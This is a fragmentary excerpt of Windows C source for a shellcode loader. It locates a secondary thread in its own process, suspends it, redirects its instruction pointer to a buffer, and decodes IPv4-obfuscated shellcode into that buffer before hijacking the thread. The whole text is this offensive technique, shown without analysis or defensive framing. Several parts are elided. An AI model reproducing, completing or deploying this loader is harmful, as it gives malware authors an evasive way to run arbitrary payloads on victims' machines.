...
BOOL GetLocalThHandle(IN DWORD dwMainTh, OUT DWORD* dwThId, OUT HANDLE* hThr) {
    ...
    snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, ProcId);
    ...
    do {
        if (thr.th32OwnerProcessID == ProcId && thr.th32ThreadID != dwMainTh) {
            *dwThId = thr.th32ThreadID;
            *hThr = OpenThread(THREAD_ALL_ACCESS, FALSE, *dwThId);
            if (*hThr == NULL) {
...
BOOL HijackThr(IN HANDLE hThr, IN PVOID pAddress) {
    CONTEXT ThreadCtx = { 0 };
    ThreadCtx.ContextFlags = CONTEXT_ALL;

    SuspendThread(hThr);

    if (!GetThreadContext(hThr, &ThreadCtx)) {
        printf("Failed to get thread context");
    }
    ThreadCtx.Rip = (DWORD64)pAddress;
    if (!SetThreadContext(hThr, &ThreadCtx)) {
...
int main(int argc, char* argv[]) {
    ...
    HANDLE hThr = NULL;
    DWORD dwMainTh = GetCurrentThreadId();
    DWORD dwThId = 0;

    if (!GetLocalThHandle(dwMainTh, &dwThId, &hThr)) {
    ...
    DecodeIPv4Fuscation(IPv4Shell, LpBaseAddress);
    if (!HijackThr(hThr, LpBaseAddress)) {
